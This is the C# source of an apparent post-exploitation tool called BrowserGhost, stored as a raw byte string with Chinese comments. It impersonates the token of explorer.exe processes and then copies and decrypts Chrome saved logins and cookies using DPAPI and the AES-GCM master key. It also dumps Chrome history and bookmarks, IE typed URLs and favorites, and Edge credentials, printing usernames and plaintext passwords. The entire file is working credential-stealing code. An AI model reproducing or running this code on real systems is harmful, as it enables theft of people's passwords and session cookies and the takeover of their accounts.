b'using System;\r\nusing System.Data;\r\nusing System.Security.Cryptography;\r\nusing System.Text;\r\nusing System.Diagnostics;\r\nusing System.IO;\r\nusing CS_SQLite3;\r\nusing System.Management;\r\nusing System.Runtime.InteropServices;\r\nusing Microsoft.Win32;\r\nusing System.Text.RegularExpressions;\r\nusing SharpEdge;\r\n\r\n\r\nnamespace BrowserGhost\r\n{\r\n    class Program\r\n    {\r\n\r\n\r\n        // Constants that are going to be used during our procedure.\r\n        private const int ANYSIZE_ARRAY = 1;\r\n        public static uint SE_PRIVILEGE_ENABLED = 0x00000002;\r\n        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;\r\n        public static uint STANDARD_RIGHTS_READ = 0x00020000;\r\n        public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;\r\n        public static uint TOKEN_DUPLICATE = 0x00000002;\r\n        public static uint TOKEN_IMPERSONATE = 0x00000004;\r\n        public static uint TOKEN_QUERY = 0x00000008;\r\n        public static uint TOKEN_QUERY_SOURCE = 0x00000010;\r\n        public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;\r\n        public static uint TOKEN_ADJUST_GROUPS = 0x00000040;\r\n        public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;\r\n        public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;\r\n        public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;\r\n        public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct LUID_AND_ATTRIBUTES\r\n        {\r\n            public LUID Luid;\r\n            public UInt32 Attributes;\r\n\r\n            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;\r\n            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;\r\n            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;\r\n            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;\r\n        }\r\n\r\n        // Luid Structure Definition\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct LUID\r\n        {\r\n            public UInt32 LowPart;\r\n            public Int32 HighPart;\r\n        }\r\n\r\n        public struct TOKEN_PRIVILEGES\r\n        {\r\n            public int PrivilegeCount;\r\n            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]\r\n            public LUID_AND_ATTRIBUTES[] Privileges;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct PRIVILEGE_SET\r\n        {\r\n            public uint PrivilegeCount;\r\n            public uint Control;  // use PRIVILEGE_SET_ALL_NECESSARY\r\n\r\n            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;\r\n\r\n            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]\r\n            public LUID_AND_ATTRIBUTES[] Privilege;\r\n        }\r\n\r\n        [Flags]\r\n        public enum ProcessAccessFlags : uint\r\n        {\r\n            All = 0x001F0FFF,\r\n            Terminate = 0x00000001,\r\n            CreateThread = 0x00000002,\r\n            VirtualMemoryOperation = 0x00000008,\r\n            VirtualMemoryRead = 0x00000010,\r\n            VirtualMemoryWrite = 0x00000020,\r\n            DuplicateHandle = 0x00000040,\r\n            CreateProcess = 0x000000080,\r\n            SetQuota = 0x00000100,\r\n            SetInformation = 0x00000200,\r\n            QueryInformation = 0x00000400,\r\n            QueryLimitedInformation = 0x00001000,\r\n            Synchronize = 0x00100000\r\n        }\r\n\r\n\r\n\r\n        // LookupPrivilegeValue\r\n        [DllImport("advapi32.dll")]\r\n        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);\r\n\r\n        //\xe5\x9b\x9e\xe9\x80\x80\xe5\x88\xb0\xe5\x8e\x9f\xe5\xa7\x8b\xe6\x9d\x83\xe9\x99\x90\r\n        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]\r\n        public static extern bool RevertToSelf();\r\n\r\n\r\n        // OpenProcess\r\n        [DllImport("kernel32.dll", SetLastError = true)]\r\n        public static extern IntPtr OpenProcess(\r\n         ProcessAccessFlags processAccess,\r\n         bool bInheritHandle,\r\n         int processId);\r\n        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)\r\n        {\r\n            return OpenProcess(flags, false, proc.Id);\r\n        }\r\n\r\n        // OpenProcessToken\r\n        [DllImport("advapi32.dll", SetLastError = true)]\r\n        [return: MarshalAs(UnmanagedType.Bool)]\r\n        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);\r\n\r\n        // DuplicateToken\r\n        [DllImport("advapi32.dll")]\r\n        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);\r\n\r\n        // SetThreadToken\r\n        [DllImport("advapi32.dll", SetLastError = true)]\r\n        private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);\r\n\r\n        // AdjustTokenPrivileges\r\n        [DllImport("advapi32.dll", SetLastError = true)]\r\n        [return: MarshalAs(UnmanagedType.Bool)]\r\n        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,\r\n           [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,\r\n           ref TOKEN_PRIVILEGES NewState,\r\n           UInt32 BufferLengthInBytes,\r\n           ref TOKEN_PRIVILEGES PreviousState,\r\n           out UInt32 ReturnLengthInBytes);\r\n\r\n        // GetCurrentProcess\r\n        [DllImport("kernel32.dll", SetLastError = true)]\r\n        static extern IntPtr GetCurrentProcess();\r\n\r\n\r\n        [DllImport("advapi32.dll", SetLastError = true)]\r\n        public static extern bool PrivilegeCheck(\r\n            IntPtr ClientToken,\r\n            ref PRIVILEGE_SET RequiredPrivileges,\r\n            out bool pfResult\r\n            );\r\n\r\n        // Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P\r\n        public static bool IsPrivilegeEnabled(string Privilege)\r\n        {\r\n            bool ret;\r\n            LUID luid = new LUID();\r\n            IntPtr hProcess = GetCurrentProcess();\r\n            IntPtr hToken;\r\n            if (hProcess == IntPtr.Zero) return false;\r\n            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken)) return false;\r\n            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;\r\n            PRIVILEGE_SET privs = new PRIVILEGE_SET { Privilege = new LUID_AND_ATTRIBUTES[1], Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };\r\n            privs.Privilege[0].Luid = luid;\r\n            privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;\r\n            if (!PrivilegeCheck(hToken, ref privs, out ret)) return false;\r\n            return ret;\r\n        }\r\n\r\n        public static bool EnablePrivilege(string Privilege)\r\n        {\r\n            LUID luid = new LUID();\r\n            IntPtr hProcess = GetCurrentProcess();\r\n            IntPtr hToken;\r\n            if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;\r\n            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;\r\n            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.\r\n            LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };\r\n            // Now we create a TOKEN_PRIVILEGES structure with our modifications\r\n            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[1] };\r\n            tp.Privileges[0] = luAttr;\r\n            TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES(); // Our old state.\r\n            if (!AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;\r\n            return true;\r\n        }\r\n\r\n        public static bool ImpersonateProcessToken(int pid)\r\n        {\r\n            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);\r\n            if (hProcess == IntPtr.Zero) return false;\r\n            IntPtr hToken;\r\n            if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) return false;\r\n            IntPtr DuplicatedToken = new IntPtr();\r\n            if (!DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;\r\n            if (!SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;\r\n            return true;\r\n        }\r\n        private static string GetProcessUserName(int pID)\r\n        {\r\n\r\n\r\n            string text1 = null;\r\n\r\n\r\n            SelectQuery query1 =\r\n              new SelectQuery("Select * from Win32_Process WHERE processID=" + pID);\r\n            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);\r\n\r\n\r\n            try\r\n            {\r\n                foreach (ManagementObject disk in searcher1.Get())\r\n                {\r\n                    ManagementBaseObject inPar = null;\r\n                    ManagementBaseObject outPar = null;\r\n\r\n\r\n                    inPar = disk.GetMethodParameters("GetOwner");\r\n\r\n\r\n                    outPar = disk.InvokeMethod("GetOwner", inPar, null);\r\n\r\n\r\n                    text1 = outPar["User"].ToString();\r\n                    break;\r\n                }\r\n            }\r\n            catch\r\n            {\r\n                text1 = "SYSTEM";\r\n            }\r\n\r\n\r\n            return text1;\r\n        }\r\n\r\n        public static byte[] GetMasterKey(string filePath)\r\n        {\r\n            //Key saved in Local State file\r\n\r\n            byte[] masterKey = new byte[] { };\r\n\r\n            if (File.Exists(filePath) == false)\r\n                return null;\r\n\r\n            //Get key with regex.\r\n            var pattern = new System.Text.RegularExpressions.Regex("\\"encrypted_key\\":\\"(.*?)\\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));\r\n\r\n            foreach (System.Text.RegularExpressions.Match prof in pattern)\r\n            {\r\n                if (prof.Success)\r\n                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64\r\n            }\r\n\r\n            //Trim first 5 bytes. Its signature "DPAPI"\r\n            byte[] temp = new byte[masterKey.Length - 5];\r\n            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);\r\n\r\n            try\r\n            {\r\n                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);\r\n            }\r\n            catch (Exception ex)\r\n            {\r\n                Console.WriteLine(ex.ToString());\r\n                return null;\r\n            }\r\n        }\r\n\r\n\r\n\r\n        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)\r\n        {\r\n            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes\r\n\r\n            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.\r\n            Array.Copy(encryptedData, 3, iv, 0, 12);\r\n\r\n            try\r\n            {\r\n                //encryptedData without IV\r\n                byte[] Buffer = new byte[encryptedData.Length - 15];\r\n                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);\r\n\r\n                byte[] tag = new byte[16]; //AuthTag\r\n                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data\r\n\r\n                //Last 16 bytes for tag\r\n                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);\r\n\r\n                //encrypted password\r\n                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);\r\n\r\n                AesGcm aesDecryptor = new AesGcm();\r\n                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));\r\n\r\n                return result;\r\n            }\r\n            catch (Exception ex)\r\n            {\r\n                Console.WriteLine(ex.ToString());\r\n                return null;\r\n            }\r\n        }\r\n\r\n        public static bool Chrome_history()\r\n        {\r\n            string chrome_History_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Default\\History";\r\n            if (File.Exists(chrome_History_path) == true)\r\n            {\r\n                \r\n                string cookie_tempFile = Path.GetTempFileName();\r\n                File.Copy(chrome_History_path, cookie_tempFile, true);\r\n\r\n                Console.WriteLine("\\t[+] Copy {0} to {1}", chrome_History_path, cookie_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);\r\n                string query = "select url,title from urls";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string url;\r\n                    string title;\r\n                    try\r\n                    {\r\n                        url = (string)row["url"];\r\n                        title = (string)row["title"];\r\n                    }\r\n                    catch\r\n                    {\r\n                        continue;\r\n\r\n                    }\r\n                    \r\n                    \r\n                    Console.WriteLine("\\t{0} \\t {1}", url, title);\r\n\r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(cookie_tempFile);\r\n                Console.WriteLine("\\t[+] Delete File {0}", cookie_tempFile);\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine("[-] {0} Not Found!", chrome_History_path);\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n\r\n\r\n        public static bool Chrome_cookies()\r\n        {\r\n            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Default\\Cookies";\r\n            if (File.Exists(chrome_cookie_path) == true)\r\n            {\r\n                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Local State";\r\n                string cookie_tempFile = Path.GetTempFileName();\r\n                File.Copy(chrome_cookie_path, cookie_tempFile, true);\r\n\r\n                Console.WriteLine("\\t[+] Copy {0} to {1}", chrome_cookie_path, cookie_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);\r\n                string query = "SELECT host_key, name,encrypted_value FROM cookies";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string host_key = (string)row["host_key"].ToString();\r\n                    string name = (string)row["name"].ToString();\r\n                    byte[] cookieBytes = Convert.FromBase64String((string)row["encrypted_value"].ToString());\r\n                    string cookie_value;\r\n                    try\r\n                    {\r\n                        //\xe8\x80\x81\xe7\x89\x88\xe6\x9c\xac\xe8\xa7\xa3\xe5\xaf\x86\r\n                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser));\r\n\r\n                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);\r\n                    }\r\n                    catch (Exception ex) //\xe5\xa6\x82\xe6\x9e\x9c\xe5\xbc\x82\xe5\xb8\xb8\xe4\xba\x86\xe5\xb0\xb1\xe7\x94\xa8\xe6\x96\xb0\xe5\x8a\xa0\xe5\xaf\x86\xe6\x96\xb9\xe5\xbc\x8f\xe5\xb0\x9d\xe8\xaf\x95\r\n                    {\r\n\r\n                        byte[] masterKey = GetMasterKey(chrome_state_file);\r\n                        cookie_value = DecryptWithKey(cookieBytes, masterKey);\r\n\r\n\r\n                    }\r\n                    Console.WriteLine("\\t[{0}] \\t {1}={2}",host_key,name, cookie_value);\r\n                    \r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(cookie_tempFile);\r\n                Console.WriteLine("\\t[+] Delete File {0}", cookie_tempFile);\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine("[-] {0} Not Found!", chrome_cookie_path);\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n\r\n        //\xe5\x81\xb7\xe4\xb8\xaa\xe6\x87\x92 \xe5\x90\x8e\xe9\x9d\xa2\xe5\x86\x8d\xe8\xa7\xa3\xe6\x9e\x90json\r\n        public static bool Chrome_books()\r\n        {\r\n            string chrome_book_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Default\\Bookmarks";\r\n            if (File.Exists(chrome_book_path) == true)\r\n            {\r\n\r\n                string booktext = File.ReadAllText(chrome_book_path);\r\n                Console.WriteLine(booktext);\r\n\r\n\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine("[-] {0} Not Found!", chrome_book_path);\r\n            }\r\n                \r\n            return true;\r\n        }\r\n        public static bool Chrome_logins()\r\n        {\r\n            //copy login data\r\n            string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Default\\Login Data";\r\n\r\n            if (File.Exists(login_data_path) == true)\r\n            {\r\n                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\Google\\Chrome\\User Data\\Local State";\r\n                string login_data_tempFile = Path.GetTempFileName();\r\n                File.Copy(login_data_path, login_data_tempFile, true);\r\n\r\n                Console.WriteLine("\\t[+] Copy {0} to {1}", login_data_path, login_data_tempFile);\r\n\r\n                SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile);\r\n                string query = "SELECT origin_url, username_value, password_value FROM logins";\r\n                DataTable resultantQuery = database.ExecuteQuery(query);\r\n\r\n                foreach (DataRow row in resultantQuery.Rows)\r\n                {\r\n                    string url;\r\n                    string username;\r\n                    string password;\r\n                    string crypt_password;\r\n                    url = (string)row["origin_url"].ToString();\r\n                    username = (string)row["username_value"].ToString();\r\n                    crypt_password = row["password_value"].ToString();\r\n\r\n\r\n                    byte[] passwordBytes = Convert.FromBase64String(crypt_password);\r\n                    \r\n                    try\r\n                    {\r\n                        //\xe8\x80\x81\xe7\x89\x88\xe6\x9c\xac\xe8\xa7\xa3\xe5\xaf\x86\r\n                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));\r\n\r\n                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);\r\n                    }\r\n                    catch (Exception ex) //\xe5\xa6\x82\xe6\x9e\x9c\xe5\xbc\x82\xe5\xb8\xb8\xe4\xba\x86\xe5\xb0\xb1\xe7\x94\xa8\xe6\x96\xb0\xe5\x8a\xa0\xe5\xaf\x86\xe6\x96\xb9\xe5\xbc\x8f\xe5\xb0\x9d\xe8\xaf\x95\r\n                    {\r\n\r\n                        byte[] masterKey = GetMasterKey(chrome_state_file);\r\n                        password = DecryptWithKey(passwordBytes, masterKey);\r\n\r\n\r\n                    }\r\n\r\n\r\n                    Console.WriteLine("\\t[URL] -> {0}\\n\\t[USERNAME] -> {1}\\n\\t[PASSWORD] -> {2}\\n", url, username, password);\r\n                    \r\n\r\n                }\r\n                database.CloseDatabase();\r\n                System.IO.File.Delete(login_data_tempFile);\r\n                Console.WriteLine("\\t[+] Delete File {0}", login_data_tempFile);\r\n            }\r\n            else\r\n            {\r\n                Console.WriteLine("[-] {0} Not Found!", login_data_path);\r\n            }\r\n\r\n                \r\n            \r\n            return false;\r\n        }\r\n\r\n        public static bool IE_history()//system \xe8\x8e\xb7\xe5\x8f\x96history\xe6\x97\xb6\xe6\x9c\x89\xe7\x82\xb9\xe9\x97\xae\xe9\xa2\x98 \r\n        {\r\n            string info = "";\r\n\r\n            RegistryKey Key;\r\n\r\n            Key = Registry.CurrentUser;\r\n            RegistryKey myreg = Key.OpenSubKey("Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs");\r\n            string[] urls = new string[26];\r\n\r\n            for (int i = 1; i < 26; i++)\r\n            {\r\n                try\r\n                {\r\n                    info = myreg.GetValue("url" + i.ToString()).ToString();\r\n                    \r\n                    urls[i] = info;\r\n                }\r\n                catch\r\n                {\r\n                    ;\r\n                }\r\n            }\r\n            foreach (string url in urls)\r\n            {\r\n                if (url != null)\r\n                {\r\n                    Console.WriteLine("\\t{0}", url);\r\n                }\r\n\r\n            }\r\n\r\n          \r\n            return true;\r\n        }\r\n\r\n        public static bool IE_books()\r\n        {\r\n            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);\r\n\r\n            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);\r\n\r\n            foreach (string url_file_path in files)\r\n            {\r\n                if (File.Exists(url_file_path) == true)\r\n                {\r\n\r\n                    string booktext = File.ReadAllText(url_file_path);\r\n\r\n                    Match match = Regex.Match(booktext, @"URL=(.*?)\\n");\r\n                    Console.WriteLine("\\t" + url_file_path);\r\n                    Console.WriteLine("\\t\\t" + match.Value);\r\n\r\n                }\r\n            }\r\n\r\n            return true;\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n\r\n\r\n            Console.WriteLine("[+] Current user {0}", Environment.UserName);\r\n\r\n            //\xe5\x85\x88\xe8\x8e\xb7\xe5\x8f\x96 explorer.exe \xe8\xbf\x9b\xe7\xa8\x8b\r\n            foreach (Process p in Process.GetProcesses())\r\n            {\r\n                int pid = p.Id;\r\n                string processname = p.ProcessName;\r\n                string process_of_user = GetProcessUserName(pid);\r\n\r\n                //                Recvtoself\r\n                if (processname == "explorer")\r\n                {\r\n\r\n                    Console.WriteLine("[*] [{0}] [{1}] [{2}]", pid, processname, process_of_user);\r\n\r\n                    ImpersonateProcessToken(pid);\r\n                    Console.WriteLine("[*] Impersonate user {0}", Environment.UserName);\r\n                    Console.WriteLine("[*] Current user {0}", Environment.UserName);\r\n\r\n                    Console.WriteLine("===============Chrome=============");\r\n                    //\xe5\xaf\x86\xe7\xa0\x81\r\n                    Console.WriteLine("\\n[*]Get Chrome Login Data");\r\n                    Chrome_logins();\r\n                    \r\n                    //\xe8\x8e\xb7\xe5\x8f\x96\xe4\xb9\xa6\xe7\xad\xbe\r\n                    Console.WriteLine("\\n[*]Get Chrome Bookmarks");\r\n                    Chrome_books();\r\n\r\n                    //cookie\r\n                    Console.WriteLine("\\n[*]Get Chrome Cookie");\r\n                    Chrome_cookies();\r\n\r\n                    Console.WriteLine("\\n[*]Get Chrome History");\r\n                    Chrome_history();\r\n\r\n                    //-----------------------IE----------------\r\n\r\n                    Console.WriteLine("===============IE=============");\r\n\r\n                    \r\n\r\n                    Console.WriteLine("\\n[*]Get IE Books");\r\n                    IE_books();\r\n\r\n                    Console.WriteLine("\\n[*]Get IE Password");\r\n                    Edge.GetLogins(); //.net2 \xe6\x8f\x90\xe5\x8f\x96\xe8\xbf\x99\xe4\xb8\xaa\xe5\xaf\x86\xe7\xa0\x81\xe5\xa4\xaa\xe5\xa4\x8d\xe6\x9d\x82\xe4\xba\x86 \xe5\x8f\x82\xe8\x80\x83\xe8\x87\xb3 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs\r\n\r\n                    Console.WriteLine("\\n[*]Get IE History");\r\n                    IE_history();\r\n                    \r\n                    //\xe5\x9b\x9e\xe9\x80\x80\xe6\x9d\x83\xe9\x99\x90\r\n                    RevertToSelf();\r\n                    Console.WriteLine("[*] Recvtoself");\r\n                    Console.WriteLine("[*] Current user {0}", Environment.UserName);\r\n                    \r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n    }\r\n}\r\n\r\n'